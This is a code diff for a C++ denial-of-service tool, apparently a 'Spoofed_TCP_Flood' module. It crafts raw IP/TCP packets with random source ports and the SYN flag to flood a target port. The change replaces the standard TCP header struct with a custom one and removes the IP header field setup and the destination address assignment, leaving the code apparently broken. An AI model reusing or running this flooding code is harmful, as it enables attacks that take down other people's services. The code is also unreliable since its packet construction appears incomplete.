@@ -2,7 +2,6 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
-#include <netinet/tcp.h>
 #include <netdb.h>
 
 #include "Randomizer.hpp"
@@ -13,7 +12,7 @@ void Spoofed_TCP_Flood::attack(const int *id) {
     std::string message{};
     char buf[8192];
     auto *ip = (struct ip *)buf;
-    auto *tcp = (struct tcphdr *)(ip + 1);
+    auto *tcp = (struct tcpheader *) (buf + sizeof(struct ip));
     struct hostent *hp;
     struct sockaddr_in dst{};
     auto s_port = Randomizer::randomInt(0, 65535);
@@ -43,33 +42,20 @@ void Spoofed_TCP_Flood::attack(const int *id) {
                 exit(EXIT_FAILURE);
             }
 
-            // IP Struct
-            ip->ip_hl = 5;
-            ip->ip_v = 4;
-            ip->ip_tos = 16;
-            ip->ip_len = htons(sizeof(buf));
-            ip->ip_id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
-            ip->ip_off = htons(0x0);
-            ip->ip_ttl = 64;
-            ip->ip_p = 6;
-            ip->ip_sum = 0;
+            // TCP struct
+            tcp->tcp_srcport = htons(static_cast<uint16_t>(s_port));
+            tcp->tcp_destport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+            tcp->tcp_seqnum = htonl(1);
+            tcp->tcp_acknum = 0;
+            tcp->tcp_offset = 5;
+            tcp->tcp_syn = 1;
+            tcp->tcp_ack = 0;
+            tcp->tcp_win = htons(32767);
+            tcp->tcp_chksum = 0;
+            tcp->tcp_urgptr = 0;
 
-            dst.sin_addr = ip->ip_dst;
-            dst.sin_family = AF_UNSPEC;
+            ip->ip_sum = csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcpheader)));
 
-            // TCP Struct
-            tcp->source = htons(static_cast<uint16_t>(s_port));
-            tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-            tcp->seq = htonl(1);
-            tcp->ack = 0;
-            tcp->doff = 5;
-            tcp->syn = 1;
-            tcp->ack_seq = 0;
-            tcp->window = htons(32767);
-            tcp->check = 0;
-            tcp->urg_ptr = 0;
-
-            ip->ip_sum = csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcphdr)));
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
